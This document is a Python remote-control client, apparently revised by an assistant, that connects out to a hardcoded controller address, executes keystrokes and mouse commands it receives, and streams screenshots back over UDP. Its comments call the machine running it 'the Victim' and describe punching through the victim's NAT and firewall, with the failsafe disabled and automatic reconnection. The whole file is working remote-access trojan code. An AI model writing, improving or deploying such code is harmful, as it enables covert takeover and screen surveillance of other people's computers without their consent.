import socket
import keyboard
import pyautogui
import threading
import time
from PIL import ImageGrab
from io import BytesIO


CONTROLLER_IP = '192.168.1.142' 
KB_PORT = 12345
MOUSE_PORT = 12346
SCREEN_PORT = 10000

pyautogui.PAUSE = 0
pyautogui.FAILSAFE = False

# 1. KEYBOARD 
def kb_client():
    while True:
        try:
            print(f"TCP: Trying to connect to Controller at {CONTROLLER_IP}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((CONTROLLER_IP, KB_PORT))
            print("TCP: Connected! Waiting for commands...")
            
            while True:
                # Wait for command from Controller
                data = sock.recv(1024).decode()
                if not data: break
                
                # Execute Key Press
                if data.startswith("k:"):
                    key = data.split(":")[1].strip()
                    try:
                        keyboard.press_and_release(key)
                    except: pass
        except Exception as e:
            print(f"KB Disconnected: {e}")
            time.sleep(3) # Wait 3 seconds before trying to reconnect

# 2. MOUSE (UDP Client - "Hole Punching")
def mouse_client():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # STEP A: Send a "Ping" packet to the Controller.
            # This opens a "hole" in the Victim's NAT/Firewall allowing replies to come back.
            sock.sendto(b'ping', (CONTROLLER_IP, MOUSE_PORT))
            
            print("UDP: Mouse Tunnel Open. Listening for movements...")
            
            while True:
                # STEP B: Listen for move commands from Controller
                data, _ = sock.recvfrom(1024)
                msg = data.decode()
                
                if msg.startswith("m:"):
                    coords = msg[2:].split(",")
                    pyautogui.moveTo(int(coords[0]), int(coords[1]))
                elif msg.startswith("c:"):
                    button = msg[2:]
                    pyautogui.click(button=button)
                    
        except Exception as e:
            print(f"Mouse Error: {e}")
            time.sleep(3)

# 3. SCREEN (UDP Client - Sends TO you)
# This was already correct in your original code!
def screen_sender():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            img = ImageGrab.grab().resize((800, 600))
            buf = BytesIO()
            img.save(buf, format="JPEG", quality=30)
            data = buf.getvalue()
            
            if len(data) < 65507:
                sock.sendto(data, (CONTROLLER_IP, SCREEN_PORT))
            
            time.sleep(0.05)
        except:
            time.sleep(1)

if __name__ == "__main__":
    # Start all threads
    threading.Thread(target=kb_client, daemon=True).start()
    threading.Thread(target=mouse_client, daemon=True).start()
    screen_sender()